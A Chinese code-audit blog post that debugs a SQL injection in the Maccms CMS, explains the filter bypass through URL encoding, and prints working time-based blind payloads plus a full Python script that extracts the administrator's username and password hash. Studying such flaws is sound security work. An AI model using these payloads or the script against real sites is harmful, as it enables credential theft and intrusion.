---
title: 动态调试|Maccms SQL 注入分析(附注入盲注脚本)
date: 2018-08-26 15:49:02
tags: [Maccms,SQL注入,动态调试,代码审计]
categories: 
- 代码审计
---
# 0x01 前言
已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
# 0x02 环境
Web： phpstudy
System： Windows 10 X64
Browser： Firefox Quantum
Python version ： 2.7
Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具

搭建这个程序也挺简单的，也是一步到位。

# 0x03 漏洞复现
1. 首先在程序的后台添加一条数据
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/1.png)
2. 执行我们的payload,可以看到网站跳转延迟了3s以上。
url:`http://sb.com/index.php?m=vod-search`
post:``wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63``

![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/2.png)
3. 因为是盲注所以注入出管理员的账号密码在下文分析。

# 0x04 SQL执行过程分析
1. 先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。
因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/
2. phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/4.png)
3. 我们先随便输入一点数据
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/3.png)
访问后会断在index.php的第一行
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/5.png)
4. F8往下走，走到第14行F7跟进去。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/6.png)
然后F8一直往下走，可以看到拦截的规则
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/8.png)
走到POST的过滤这里F7进去
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/7.png)
`arr_foreach`函数检查传过来的值是否是数组，不是数组就返回原数据，然后用`urldecode`函数URL解码。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/9.png)
最后分别对传过来的`wd`和`test`两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/10.png)
比如你输入`wd=/**/`就会被拦截
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/11.png)
因为`/**/`存在拦截的正则表达式里面。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/12.png)
5. 走出来会到`$m = be('get','m');`这里，这里只是对`m`传过来的`vod-search`进行`addslashes`函数的过滤
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/13.png)
6. 我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是`vod`，所以会包含`vod.php`文件并执行。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/14.png)
7. 因为我们传参是`search`所以会走到这里，我们可以F7进去看执行的过程。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/15.png)
在这里会经过`urldecode`函数的解码，一直循环到不能解码为止，然后经过刚才的`StopAttack`方法的过滤 
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/16.png)
最后到`htmlEncode`方法的替换
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/17.png)
8. 跳出到`vod.php`文件后F8走到这里，F7进去看SQL执行的过程。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/18.png)
一直走到`markname`的值是`vod`
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/19.png)
然后不用管F8继续往下走，走到这里再F7进去
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/20.png)
可以看到SQL执行是到这里，下面是执行的语句
`SELECT count(*) FROM {pre}vod WHERE 1=1  AND d_hide=0 AND d_type>0  and d_type not in(0) and d_usergroup in(0)  AND ( instr(d_name,'test')>0 or instr(d_subname,'test')>0 or instr(d_starring,'test')>0 ) `
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/21.png)
# 0x05 漏洞分析

上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。

1. 刚才这里跳过了，文件位置：`inc/common/template.php`,可以看到传过来的`P["wd"]`值赋值给了`$lp['wd']`。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/22.png)
2. 再往下看753~755行，可以看到我们的值是放在这里面，然后送去`GetOne`执行的。
```php
if (!empty($lp['wd'])){
		        	$where .= ' AND ( instr(d_name,\''.$lp['wd'].'\')>0 or instr(d_subname,\''.$lp['wd'].'\')>0 or instr(d_starring,\''.$lp['wd'].'\')>0 ) ';
		        }
```
3. 构造的语句,只有中间才是执行的语句，前一句是为了闭合单引号，后面是注释。如果这里不清楚的可以用MySQL监控的软件去一步一步弄清楚。
```
SELECT count(*) FROM mac_vod WHERE 1=1  AND d_hide=0 AND d_type>0  and d_type not in(0) and d_usergroup in(0)  AND
 ( instr(d_name,'))||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(3)),0)#\')>0 or instr(d_subname,'))
 ||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(3)),0)
 #\')>0 or instr(d_starring,'))||if((select ascii(length((select(m_name) from(mac_manager))))=53),(`sleep`(5)),0)#\')>0 )
```
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/23.png)
4. 但是如果直接放语句上去会被检测到危险字符
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/24.png)
它主要对我们这里的空格连接处匹配到了
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/25.png)
那么我们可以用别名as 	&lsquo;	&lsquo;去代替，也可以省略as直接用	&lsquo;	&lsquo;，别名的用法在文章尾部的参考有给出。
5. 我们再执行，用Seay的代码审计工具的Mysql监控软件查看，我们的空格和后面的`\`被转义了。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/26.png)
还记得我们`chkSql`方法吗？先是执行`urldecode`解码，然后`StopAttack`匹配，最后`htmlEncode`编码，最后`Be`方法那里	还有一个`addslashes`函数过滤，所以会导致后面的`\`转义成`\\`。`htmlEncode`又会对前面的空格转义成`&nbsp;`。
```php
function chkSql($s)
{
	global $getfilter;
	if(empty($s)){
		return "";
	}
	$d=$s;
	while(true){
		$s = urldecode($d);
		if($s==$d){
			break;
		}
		$d = $s;
	}
	StopAttack(1,$s,$getfilter);
	return htmlEncode($s);
}
```
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/27.png)
6. 这里我们可以利用URL编码绕过`htmlEncode`，具体可以看HTML URL编码表`%0c` `%0b`等都可以，后面的`\`可以用URL编码绕过`%5c`或者双编码`%25%35%63`
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/28.png)
7. 那么我们构造成的payload就是下面的，功能是查询管理员账号字段的长度
``wd=))||if((select%0cascii(length((select(m_name)``from(mac_manager))))=53),(`sleep`(3)),0)#%5c``

# 0x06 编写盲注脚本
当然盲注一般都不会手动去，SQLMAP有时候遇到特殊的也是要自己编写注入的脚本，具体代码的意思我就不解读了，自己可以结合Python和MySQL的知识理解。
![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms/29.png)
```python
#! /usr/bin/python
# -*- coding:utf-8 -*-
#author:F0rmat
import requests
import time
dict = "1234567890qwertyuiopasdfghjklzxcvbnm_{}QWERTYUIOPASDFGHJKLZXCVBNM,@.?"
UserName=''
UserPass=''
UserName_length=0
url='http://sb.com/'
url = url + r'/index.php?m=vod-search'
def main():
    global UserName
    global url
    for i in range(30):
        startTime = time.time()
        sql = "))||if((select%0bascii(length((select(m_name)``from(mac_manager))))={}),(`sleep`(3)),0)#%25%35%63".format(
            ord(str(i)))
        data = {'wd': sql}
        response = requests.post(url, data=data)  # 发送请求
        if time.time() - startTime > 3:
            UserName_length = i
            print UserName_length
            break
    for num in range(1, UserName_length + 1):
        for i in dict:  # 遍历取出字符
            startTime = time.time()
            sql = "))||if((select%0bascii(substr((select(m_name)``from(mac_manager)),{},1))={}),(`sleep`(3)),0)#%25%35%63".format(
                str(num), ord(i))
            data = {'wd': sql}
            response = requests.post(url, data=data)  # 发送请求
            print data
            if time.time() - startTime > 3:
                UserName += i
                break
    global UserPass
    for num in range(32):
        for i in dict:  # 遍历取出字符
            startTime = time.time()
            sql = "))||if((select%0bascii(substr((select(m_password)``from(mac_manager)),{},1))={}),(`sleep`(3)),0)#%25%35%63".format(
                str(num), ord(i))
            data = {'wd': sql}
            response = requests.post(url, data=data)  # 发送请求
            print data
            if time.time() - startTime > 3:
                UserPass += i
                break
    print 'username:'+UserName,'password:'+UserPass
if __name__ == '__main__':
    main()
```
# 0x07 总结
有时候学习代码审计，不能因为部分的代码没能读懂就不去理会，其实你读的代码越多，做代码审计也越轻松。
# 0x08 参考
程序下载：https://www.lanzous.com/i1qm24f
http://www.freebuf.com/column/161528.html
http://www.mysqltutorial.org/mysql-alias/
http://www.w3school.com.cn/tags/html_ref_urlencode.html
https://github.com/F0r3at/Python-Tools/blob/master/maccms_sql.py